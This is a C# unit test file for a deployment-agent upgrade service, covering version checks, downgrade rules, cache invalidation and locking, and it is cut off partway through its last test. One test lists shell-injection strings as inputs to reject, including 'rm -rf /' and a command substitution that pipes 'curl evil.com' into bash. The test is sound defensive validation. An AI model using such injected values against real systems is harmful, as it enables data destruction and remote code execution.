using System.Linq;
using Squid.Core.Persistence.Entities.Deployments;
using Squid.Core.Services.Caching.Redis;
using Squid.Core.Services.DeploymentExecution.Tentacle;
using Squid.Core.Services.Jobs;
using Squid.Core.Services.Machines;
using Squid.Core.Services.Machines.Exceptions;
using Squid.Core.Services.Machines.Upgrade;
using Squid.Message.Commands.Machine;
using Squid.Message.Enums;
using Squid.Message.Enums.Caching;
using Squid.Message.Requests.Machines;

namespace Squid.UnitTests.Services.Machines.Upgrade;

/// <summary>
/// Behavioural coverage for the upgrade orchestrator. Verifies the per-style
/// strategy dispatch, version skipping, current-version detection from cache,
/// and operator-supplied override taking precedence over the bundled version.
/// </summary>
public sealed class MachineUpgradeServiceTests
{
    private readonly Mock<IMachineDataProvider> _machineDataProvider = new();
    private readonly InMemoryMachineRuntimeCapabilitiesCache _runtimeCache = new();
    private readonly Mock<ITentacleVersionRegistry> _versionRegistry = new();
    private readonly Mock<IMachineUpgradeStrategy> _linuxStrategy = new();
    private readonly Mock<IMachineUpgradeStrategy> _k8sStrategy = new();
    private readonly Mock<IRedisSafeRunner> _redisLock = new();
    private readonly Mock<ISquidBackgroundJobClient> _backgroundJobClient = new();
    private readonly MachineUpgradeService _service;

    public MachineUpgradeServiceTests()
    {
        // Default: registry returns 1.4.0 for every recognized style. Tests
        // that exercise the no-version path override on a per-test basis.
        _versionRegistry
            .Setup(x => x.GetLatestVersionAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync("1.4.0");

        _linuxStrategy.Setup(s => s.CanHandle(nameof(CommunicationStyle.TentaclePolling))).Returns(true);
        _linuxStrategy.Setup(s => s.CanHandle(nameof(CommunicationStyle.TentacleListening))).Returns(true);

        _k8sStrategy.Setup(s => s.CanHandle(nameof(CommunicationStyle.KubernetesAgent))).Returns(true);

        // Default: lock is acquired and the supplied logic runs immediately.
        // Tests that exercise the lock-failed path override this on a per-test basis.
        _redisLock
            .Setup(x => x.ExecuteWithLockAsync<UpgradeMachineResponseData>(
                It.IsAny<string>(),
                It.IsAny<Func<Task<UpgradeMachineResponseData>>>(),
                It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(),
                It.IsAny<RedisServer>()))
            .Returns<string, Func<Task<UpgradeMachineResponseData>>, TimeSpan?, TimeSpan?, TimeSpan?, RedisServer>(
                (_, logic, _, _, _, _) => logic());

        _service = new MachineUpgradeService(
            _machineDataProvider.Object,
            _runtimeCache,
            _versionRegistry.Object,
            new[] { _linuxStrategy.Object, _k8sStrategy.Object },
            _redisLock.Object,
            _backgroundJobClient.Object);
    }

    [Fact]
    public async Task UpgradeAsync_MachineNotFound_ThrowsMachineNotFoundException()
    {
        _machineDataProvider
            .Setup(x => x.GetMachinesByIdAsync(404, It.IsAny<CancellationToken>()))
            .ReturnsAsync((Machine)null);

        var ex = await Should.ThrowAsync<MachineNotFoundException>(() =>
            _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 404 }, CancellationToken.None));

        ex.MachineId.ShouldBe(404);
    }

    [Fact]
    public async Task UpgradeAsync_RegistryReturnsEmptyAndNoExplicitTarget_ReturnsFailedWithGuidance()
    {
        _versionRegistry
            .Setup(x => x.GetLatestVersionAsync(nameof(CommunicationStyle.TentaclePolling), It.IsAny<CancellationToken>()))
            .ReturnsAsync(string.Empty);
        ArrangeMachine(id: 1, style: nameof(CommunicationStyle.TentaclePolling));

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 1 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Failed);
        resp.Detail.ShouldContain("Could not resolve target tentacle version");
        _linuxStrategy.Verify(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task UpgradeAsync_AlreadyOnTargetVersion_ShortCircuitsWithoutDispatchingStrategy()
    {
        ArrangeMachine(id: 7, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(7, new Dictionary<string, string>(), agentVersion: "1.4.0");

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 7 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.AlreadyUpToDate);
        resp.CurrentVersion.ShouldBe("1.4.0");
        resp.TargetVersion.ShouldBe("1.4.0");
        _linuxStrategy.Verify(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task UpgradeAsync_CurrentVersionNewerThanTarget_DefaultBehavior_RejectsAsDowngradeWithHint()
    {
        ArrangeMachine(id: 8, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(8, new Dictionary<string, string>(), agentVersion: "2.0.0");

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 8 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.AlreadyUpToDate);
        resp.Detail.ShouldContain("higher than requested",
            customMessage: "must distinguish downgrade attempt from genuine up-to-date in the detail message");
        resp.Detail.ShouldContain("AllowDowngrade",
            customMessage: "must surface the escape hatch flag so operator knows how to force a downgrade if really needed");
    }

    [Fact]
    public async Task UpgradeAsync_CurrentVersionNewerThanTarget_AllowDowngradeTrue_Dispatches()
    {
        // Emergency downgrade scenario (1.4.2 has a nasty regression, want to
        // revert to 1.4.0). Default-safe: blocked. With explicit opt-in: goes.
        ArrangeMachine(id: 81, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(81, new Dictionary<string, string>(), agentVersion: "2.0.0");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "forced downgrade applied", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 81, TargetVersion = "1.4.0", AllowDowngrade = true },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
        resp.TargetVersion.ShouldBe("1.4.0");
        _linuxStrategy.Verify(
            s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()),
            Times.Once,
            "AllowDowngrade=true must cause downgrade dispatch");
    }

    [Fact]
    public async Task UpgradeAsync_AllowDowngradeTrue_SameVersion_StillNoopAsAlreadyUpToDate()
    {
        // AllowDowngrade doesn't mean "always dispatch". Same version IS
        // already up-to-date and shouldn't incur a no-op dispatch even with
        // the flag on (would be wasteful filesystem churn).
        ArrangeMachine(id: 82, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(82, new Dictionary<string, string>(), agentVersion: "1.4.0");

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 82, TargetVersion = "1.4.0", AllowDowngrade = true },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.AlreadyUpToDate);
        resp.Detail.ShouldContain("already on version 1.4.0");
        _linuxStrategy.Verify(
            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
            Times.Never,
            "same-version dispatch would be a pointless filesystem/network roundtrip");
    }

    [Fact]
    public async Task UpgradeAsync_AllowDowngradeTrue_ActualUpgrade_WorksAsBefore()
    {
        // Safety: setting AllowDowngrade=true on a genuine upgrade must not
        // change the happy path.
        ArrangeMachine(id: 83, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(83, new Dictionary<string, string>(), agentVersion: "1.3.0");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "up", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 83, AllowDowngrade = true },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
    }

    [Fact]
    public async Task UpgradeAsync_OperatorOverridesTargetVersion_PreferredOverBundle()
    {
        ArrangeMachine(id: 11, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(11, new Dictionary<string, string>(), agentVersion: "1.0.0");

        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "9.9.9", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "ok", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 11, TargetVersion = "9.9.9" },
            CancellationToken.None);

        resp.TargetVersion.ShouldBe("9.9.9");
        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
        _linuxStrategy.Verify(s => s.UpgradeAsync(It.IsAny<Machine>(), "9.9.9", It.IsAny<CancellationToken>()), Times.Once);
    }

    [Fact]
    public async Task UpgradeAsync_DispatchesByCommunicationStyle_LinuxTentaclePolling()
    {
        ArrangeMachine(id: 17, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "done", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 17 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
        _linuxStrategy.Verify(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()), Times.Once);
        _k8sStrategy.Verify(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task UpgradeAsync_DispatchesByCommunicationStyle_KubernetesAgent()
    {
        ArrangeMachine(id: 22, style: nameof(CommunicationStyle.KubernetesAgent));
        _k8sStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.NotSupported, Detail = "phase 2", AgentVersionMayHaveChanged = false });

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 22 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.NotSupported);
        _linuxStrategy.Verify(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task UpgradeAsync_TwoStrategiesClaimSameStyle_ThrowsWithBothClassNames()
    {
        // Prevent silent mis-routing when a future refactor accidentally
        // widens two strategies' CanHandle() to overlap. FirstOrDefault
        // would pick whichever Autofac registered first — operator sees
        // no warning, may dispatch to the wrong transport.
        //
        // Throwing surfaces the conflict at first trigger (before any
        // Halibut dispatch, before any real side effect) and names both
        // conflicting types so the fix is obvious.
        var rogueStrategy = new Mock<IMachineUpgradeStrategy>();
        rogueStrategy.Setup(s => s.CanHandle(nameof(CommunicationStyle.TentaclePolling))).Returns(true);

        var service = new MachineUpgradeService(
            _machineDataProvider.Object,
            _runtimeCache,
            _versionRegistry.Object,
            new[] { _linuxStrategy.Object, rogueStrategy.Object },   // BOTH claim TentaclePolling
            _redisLock.Object,
            _backgroundJobClient.Object);
        ArrangeMachine(id: 201, style: nameof(CommunicationStyle.TentaclePolling));

        var ex = await Should.ThrowAsync<InvalidOperationException>(() =>
            service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 201 }, CancellationToken.None));

        ex.Message.ShouldContain("TentaclePolling");
        ex.Message.ShouldContain("Each style must have exactly one owner",
            customMessage: "error must tell the developer what the invariant is, not just what broke");
    }

    [Theory]
    [InlineData("")]                              // empty endpoint → missing CommunicationStyle
    [InlineData("{}")]                            // valid JSON but no CommunicationStyle
    [InlineData("{\"OtherField\":\"value\"}")]    // valid JSON, no CommunicationStyle either
    [InlineData("not json at all")]               // unparseable
    public async Task UpgradeAsync_EndpointJsonMissingCommunicationStyle_ReturnsFailedWithClearMessage(string endpointJson)
    {
        // Machine was registered incompletely or is in an inconsistent state.
        // Previously the service returned NotSupported with an awkward
        // detail "No upgrade strategy registered for CommunicationStyle ''"
        // (empty quotes) — no actionable info. Now we return Failed with
        // a clear remediation hint.
        _machineDataProvider
            .Setup(x => x.GetMachinesByIdAsync(99, It.IsAny<CancellationToken>()))
            .ReturnsAsync(new Machine { Id = 99, Name = "broken-machine", Endpoint = endpointJson, SpaceId = 1 });

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 99 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Failed);
        resp.Detail.ShouldContain("endpoint", Case.Insensitive);
        resp.Detail.ShouldContain("registration",
            customMessage: "must tell operator where to look (machine registration), not just 'empty quotes style'");
        resp.Detail.ShouldNotContain("''",
            customMessage: "previous 'CommunicationStyle \\'\\' not registered' message was unfriendly; must not regress");
    }

    [Fact]
    public async Task UpgradeAsync_NoStrategyForStyle_ReturnsNotSupportedWithStyleNameInDetail()
    {
        ArrangeMachine(id: 33, style: "Ssh");

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 33 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.NotSupported);
        resp.Detail.ShouldContain("Ssh");
    }

    [Fact]
    public async Task UpgradeAsync_NoStrategyForStyleAndRegistryEmpty_ReturnsNotSupported_NotMisleadingNoVersionFailure()
    {
        // Bug scenario (audit H-1): SSH style is unknown to BOTH the strategy
        // registry AND the version registry (registry returns empty for any
        // unrecognised style). Old order — version-first — surfaced
        // "Could not resolve target tentacle version: set SQUID_TARGET_LINUX_TENTACLE_VERSION"
        // which is nonsense advice for an Ssh target.
        //
        // Correct behaviour: the moment we know no strategy can act, return
        // NotSupported with the style name so the operator knows the real cause.
        ArrangeMachine(id: 88, style: "Ssh");
        _versionRegistry
            .Setup(x => x.GetLatestVersionAsync("Ssh", It.IsAny<CancellationToken>()))
            .ReturnsAsync(string.Empty);

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 88 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.NotSupported);
        resp.Detail.ShouldContain("Ssh");
        resp.Detail.ShouldNotContain("SQUID_TARGET_LINUX_TENTACLE_VERSION",
            customMessage: "must not blame missing version override when the real issue is no strategy for this style");
    }

    // ========================================================================
    // Strict semver gate — last line of defence between operator/Docker-Hub
    // input and the bash template (audit H-3/H-4/H-5).
    // ========================================================================

    [Theory]
    [InlineData("1.4.0\";rm -rf /;#")]      // shell-escape attempt
    [InlineData("1.4.0`whoami`")]            // backtick exec
    [InlineData("1.4.0$(curl evil.com|bash)")] // command substitution
    [InlineData("1.4.0\nrm -rf /")]         // newline injection
    [InlineData("1.4")]                      // 2-component → would build broken URL
    [InlineData("1.4.0.0")]                  // 4-component → System.Version legacy
    [InlineData("latest")]                   // garbage tag
    [InlineData("v1.4.0")]                   // leading 'v' rejected
    public async Task UpgradeAsync_NonSemverTargetVersion_RejectedBeforeStrategyDispatch(string evilOrMalformedTarget)
    {
        // Audit H-5: the bash template did unsanitised .Replace("{{TARGET_VERSION}}", input).
        // The strict semver gate at the service boundary makes shell-injection
        // structurally impossible — the upgrade is refused before the embedded
        // script template ever gets the value.
        ArrangeMachine(id: 91, style: nameof(CommunicationStyle.TentaclePolling));

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 91, TargetVersion = evilOrMalformedTarget },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Failed);
        resp.Detail.ShouldContain("not valid semver");
        _linuxStrategy.Verify(
            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
            Times.Never);
    }

    [Fact]
    public async Task UpgradeAsync_PreReleaseTargetVersion_DispatchedNormally()
    {
        // Audit H-3: System.Version dropped pre-release tags silently;
        // SemVer accepts them so canary builds work end-to-end.
        ArrangeMachine(id: 92, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "2.0.0-beta.1", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "ok", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 92, TargetVersion = "2.0.0-beta.1" },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
        resp.TargetVersion.ShouldBe("2.0.0-beta.1");
    }

    [Fact]
    public async Task UpgradeAsync_PreReleaseCurrentVsStableTarget_PreSkipsCorrectly()
    {
        // Audit H-17: with old code, current=1.4.0-beta.1 vs target=1.4.0
        // fell through to string-equality and dispatched a redundant upgrade
        // (the agent already runs a NEWER beta but the server thinks not).
        // Per semver, 1.4.0 > 1.4.0-beta.1, so this is correctly NOT up-to-date.
        ArrangeMachine(id: 93, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(93, new Dictionary<string, string>(), agentVersion: "1.4.0-beta.1");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "promoted from beta", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 93, TargetVersion = "1.4.0" },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Upgraded);
    }

    [Fact]
    public async Task UpgradeAsync_StableCurrentVsPreReleaseTarget_NotPreSkipped()
    {
        // The reverse: agent on 1.4.0 stable, operator wants to install 1.4.0-beta.1.
        // Per semver 1.4.0 > 1.4.0-beta.1, so this would be a downgrade. The
        // service used to silently allow it; with proper compare, "current
        // already higher than target" → AlreadyUpToDate is the safe answer.
        ArrangeMachine(id: 94, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(94, new Dictionary<string, string>(), agentVersion: "1.4.0");

        var resp = await _service.UpgradeAsync(
            new UpgradeMachineCommand { MachineId = 94, TargetVersion = "1.4.0-beta.1" },
            CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.AlreadyUpToDate);
        _linuxStrategy.Verify(
            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
            Times.Never);
    }

    [Fact]
    public async Task UpgradeAsync_NoStrategyForStyle_DoesNotInvokeVersionRegistry()
    {
        // Optimisation correctness: if no strategy can act, we should not
        // burn a Docker Hub round-trip looking up a version we'll never use.
        // Locks in the "strategy-first" ordering — a future refactor that
        // accidentally re-introduces a registry call before strategy
        // resolution will trip this assertion.
        ArrangeMachine(id: 89, style: "Ssh");

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 89 }, CancellationToken.None);

        _versionRegistry.Verify(
            x => x.GetLatestVersionAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()),
            Times.Never,
            "no strategy → no need to query version registry");
    }

    [Fact]
    public async Task UpgradeAsync_CacheMiss_ProceedsWithEmptyCurrentVersion()
    {
        // Cold cache — a brand-new machine that hasn't been health-checked yet.
        // We can't pre-skip, but we still dispatch so the operator's request
        // does something useful. Strategy returns Initiated; service surfaces it.
        ArrangeMachine(id: 44, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Initiated, Detail = "dispatched", AgentVersionMayHaveChanged = true });

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 44 }, CancellationToken.None);

        resp.CurrentVersion.ShouldBe(string.Empty);
        resp.Status.ShouldBe(MachineUpgradeStatus.Initiated);
    }

    // ========================================================================
    // Cache invalidation post-upgrade — without this the server would keep
    // reporting the agent's old version for up to a full health-check interval,
    // making the upgrade appear to "not take" in the UI.
    // ========================================================================

    [Fact]
    public async Task UpgradeAsync_StrategyReportsAgentVersionChanged_InvalidatesRuntimeCache()
    {
        // Audit N-6: invalidation is now driven by the strategy's explicit
        // `AgentVersionMayHaveChanged` flag instead of an enum-switch in the
        // orchestrator. This test no longer cares which Status was returned —
        // only that the flag means "drop the cache".
        ArrangeMachine(id: 51, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(51, new Dictionary<string, string>(), agentVersion: "1.0.0");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "ok", AgentVersionMayHaveChanged = true });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 51 }, CancellationToken.None);

        _runtimeCache.TryGet(51).AgentVersion.ShouldBeEmpty(
            "AgentVersionMayHaveChanged=true must drop the cached version so the next health check reads fresh");
    }

    [Fact]
    public async Task UpgradeAsync_StrategyReportsAgentUnchanged_LeavesRuntimeCacheIntact()
    {
        ArrangeMachine(id: 52, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(52, new Dictionary<string, string>(), agentVersion: "1.0.0");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Failed, Detail = "rolled back", AgentVersionMayHaveChanged = false });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 52 }, CancellationToken.None);

        // Cache still 1.0.0 — bash script rolled back, agent still on 1.0.0,
        // invalidation would force a needless capabilities round-trip.
        _runtimeCache.TryGet(52).AgentVersion.ShouldBe("1.0.0");
    }

    [Fact]
    public async Task UpgradeAsync_StatusIsUpgradedButFlagFalse_DoesNotInvalidate_OutcomeFlagWins()
    {
        // Belt-and-braces: orchestrator must NOT inspect Status to decide.
        // If a strategy returns Upgraded but explicitly says "no version
        // change actually happened" (a hypothetical no-op success), cache
        // is preserved. This pins the orchestrator's flag-only decision.
        ArrangeMachine(id: 53, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(53, new Dictionary<string, string>(), agentVersion: "1.0.0");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Upgraded, Detail = "no-op success", AgentVersionMayHaveChanged = false });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 53 }, CancellationToken.None);

        _runtimeCache.TryGet(53).AgentVersion.ShouldBe("1.0.0",
            "orchestrator must read the flag, not the Status enum (audit N-6 regression guard)");
    }

    [Fact]
    public async Task UpgradeAsync_StatusIsFailedButFlagTrue_DoesInvalidate_OutcomeFlagWins()
    {
        // The mirror image: Failed but the strategy is sure the binary did
        // change (e.g. partial-write detected, agent in unknown state).
        // Flag wins — invalidate.
        ArrangeMachine(id: 54, style: nameof(CommunicationStyle.TentaclePolling));
        _runtimeCache.Store(54, new Dictionary<string, string>(), agentVersion: "1.0.0");
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), "1.4.0", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome { Status = MachineUpgradeStatus.Failed, Detail = "partial swap, unknown state", AgentVersionMayHaveChanged = true });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 54 }, CancellationToken.None);

        _runtimeCache.TryGet(54).AgentVersion.ShouldBeEmpty();
    }

    // ========================================================================
    // Distributed lock — multi-replica server safety. When two API pods get
    // the same upgrade trigger, exactly one runs the strategy.
    // ========================================================================

    [Fact]
    public async Task UpgradeAsync_LockAcquisitionFails_ReturnsFailedWithRetryHint()
    {
        // Simulate the contended path: another replica already holds the lock,
        // ExecuteWithLockAsync returns null (per RedisSafeRunner's contract).
        ArrangeMachine(id: 61, style: nameof(CommunicationStyle.TentaclePolling));
        _redisLock
            .Setup(x => x.ExecuteWithLockAsync<UpgradeMachineResponseData>(
                It.IsAny<string>(),
                It.IsAny<Func<Task<UpgradeMachineResponseData>>>(),
                It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(), It.IsAny<TimeSpan?>(),
                It.IsAny<RedisServer>()))
            .ReturnsAsync((UpgradeMachineResponseData)null);

        var resp = await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 61 }, CancellationToken.None);

        resp.Status.ShouldBe(MachineUpgradeStatus.Failed);
        resp.Detail.ShouldContain("currently being upgraded",
            customMessage: "lock-contention detail must be human-readable, not expose infra term 'distributed lock'");
        resp.Detail.ShouldContain("retry",
            customMessage: "detail must tell the operator what to do next");
        resp.Detail.ShouldNotContain("distributed lock",
            customMessage: "Round-3 UX improvement: operator shouldn't see infra jargon");
        _linuxStrategy.Verify(
            s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()),
            Times.Never,
            "strategy must NOT run when lock acquisition failed — that is the entire point of the lock");
    }

    [Fact]
    public async Task UpgradeAsync_OnVersionChange_SchedulesRapidHealthCheckSeries()
    {
        // 1.6.x UX fix (real-time progress): after a successful dispatch
        // that may have changed the agent version, the service schedules
        // N Hangfire jobs at interval-spaced delays over the upgrade
        // window. Each job re-captures events + log + version via a
        // Capabilities RPC, populating server-side stores so FE polling
        // sees near-real-time progress.
        //
        // Without the series, FE polling `/upgrade-events` during the
        // 30-60s upgrade window would see "empty events" — the very
        // symptom we're fixing.
        //
        // Pin: exactly N = window/interval = 45/3 = 15 Hangfire jobs
        // are scheduled on successful dispatch.
        ArrangeMachine(id: 301, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome
            {
                Status = MachineUpgradeStatus.Upgraded,
                Detail = "upgrade dispatched",
                AgentVersionMayHaveChanged = true
            });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 301 }, CancellationToken.None);

        var expectedJobCount = MachineUpgradeService.UpgradePollingWindowSeconds / MachineUpgradeService.UpgradePollingIntervalSeconds;
        _backgroundJobClient.Verify(
            c => c.Schedule<IMachineHealthCheckService>(
                It.IsAny<System.Linq.Expressions.Expression<Func<IMachineHealthCheckService, Task>>>(),
                It.IsAny<TimeSpan>(),
                It.IsAny<string>()),
            Times.Exactly(expectedJobCount),
            $"successful upgrade dispatch must schedule exactly {expectedJobCount} rapid health checks covering the upgrade progress window");
    }

    [Fact]
    public async Task UpgradeAsync_OnVersionChange_FirstCheckScheduledAtIntervalBoundary()
    {
        // Jobs fire at 3s, 6s, ..., 45s (interval = 3s, window = 45s).
        // Verify the smallest scheduled delay is ≥ 3s — doesn't fire
        // "immediately" which would race the agent's own Phase A start.
        ArrangeMachine(id: 303, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome
            {
                Status = MachineUpgradeStatus.Upgraded,
                Detail = "upgrade dispatched",
                AgentVersionMayHaveChanged = true
            });

        var capturedDelays = new List<TimeSpan>();
        _backgroundJobClient
            .Setup(c => c.Schedule<IMachineHealthCheckService>(
                It.IsAny<System.Linq.Expressions.Expression<Func<IMachineHealthCheckService, Task>>>(),
                It.IsAny<TimeSpan>(),
                It.IsAny<string>()))
            .Callback<System.Linq.Expressions.Expression<Func<IMachineHealthCheckService, Task>>, TimeSpan, string>(
                (_, delay, _) => capturedDelays.Add(delay))
            .Returns("mock-job-id");

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 303 }, CancellationToken.None);

        capturedDelays.Min().ShouldBeGreaterThanOrEqualTo(TimeSpan.FromSeconds(MachineUpgradeService.UpgradePollingIntervalSeconds),
            customMessage: "first poll must wait at least one interval — no instant-fire that races Phase A");
        capturedDelays.Max().ShouldBeLessThanOrEqualTo(TimeSpan.FromSeconds(MachineUpgradeService.UpgradePollingWindowSeconds),
            customMessage: "last poll must not exceed the window — bounded polling, no indefinite drain");
    }

    [Fact]
    public async Task UpgradeAsync_VersionUnchanged_DoesNotSchedulePolling()
    {
        // No-op outcomes (UpToDate, NotSupported, Failed pre-dispatch)
        // shouldn't trigger 15 health checks — nothing changed, cache is
        // still accurate. Otherwise we'd wake Hangfire ×15 times + the
        // health check for zero reason on every "already on latest" click.
        ArrangeMachine(id: 302, style: nameof(CommunicationStyle.TentaclePolling));
        _linuxStrategy
            .Setup(s => s.UpgradeAsync(It.IsAny<Machine>(), It.IsAny<string>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new MachineUpgradeOutcome
            {
                Status = MachineUpgradeStatus.AlreadyUpToDate,
                Detail = "already on 1.4.0",
                AgentVersionMayHaveChanged = false
            });

        await _service.UpgradeAsync(new UpgradeMachineCommand { MachineId = 302 }, CancellationToken.None);

        _backgroundJobClient.Verify(
            c => c.Schedule<IMachineHealthCheckService>(
